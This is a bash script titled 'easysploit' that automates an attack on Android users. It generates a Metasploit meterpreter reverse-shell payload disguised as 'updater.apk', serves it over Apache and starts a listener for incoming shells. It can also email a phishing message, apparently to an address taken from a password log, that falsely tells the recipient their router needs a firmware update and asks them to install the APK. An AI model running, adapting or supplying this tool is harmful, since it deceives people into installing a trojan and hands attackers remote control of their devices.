#!/bin/bash

# easysploit
i="0"
resize -s 25 80
clear
while [ $i -lt 1 ]
do
clear
ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)

 echo -e '\e[1;33m
     [----------------------------------------]
     [                                        ]    
     [         PORTABLE ANDROID SNIFFER       ]    
     [                                        ]
     [----------------------------------------]
                             
                                
\e[1;32m
(1) Android --> updater.apk (payload generate)
(2) EXIT
'
 
service postgresql start
apk='1'
py='3'
jar='4' 
php='5'
scan='6'
eternalblue='7'
psexec='8'
hta='9'
me='10'
ex='2'



read x

if [ "$x" == "$ex" ]; then                    #EXE
exit


elif [ "$x" == "$apk" ]; then                          #APK
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /var/www/html/updater.apk
echo APK GENERATED
clear
echo -e '\e[1;33m
     [----------------------------------------]
     [                                        ]    
     [         PORTABLE ANDROID SNIFFER       ]    
     [                                        ]
     [----------------------------------------]
                             
                                
\e[1;32m
(1) Address of payload and Start Listner
(2) Send mail with address of payload and Start Listner

(3) EXIT
'
read y
if [ "$y" == "$apk" ]; then
systemctl start apache2.service
echo Payload accessable at adress: $ip/updater.apk
echo -e '
Waiting for listener...
 
'
msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$y" == "$ex" ]; then
systemctl start apache2.service
path="$(ls /root/pwlog)"
mail="$(tail -n 1 /root/pwlog/"${path}")"
################CREATION OF WEB PAGE####################################
echo "<html>

<head></head>

<body>
<p>Hi User,</p>
<p>Your wifi router needs an update, please follow the link:$ip/updater.apk to download the updater apk.
Once downloaded install and run the apk. You can use your router while the update is installed.</p>
<p>Regards
Team</p>
</body>
</html>" > /root/PVA_Mail+Setup/pas/test1.html
mutt -e 'set content_type = "text/html"' "${mail}" -s "Firmware Update" < /root/PVA_Mail+Setup/pas/test1.html &> /dev/null


echo -e '
Mail sent........Now Waiting for listener...
 
'
msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$y" == "$py" ]; then
exit
    
fi



fi

done



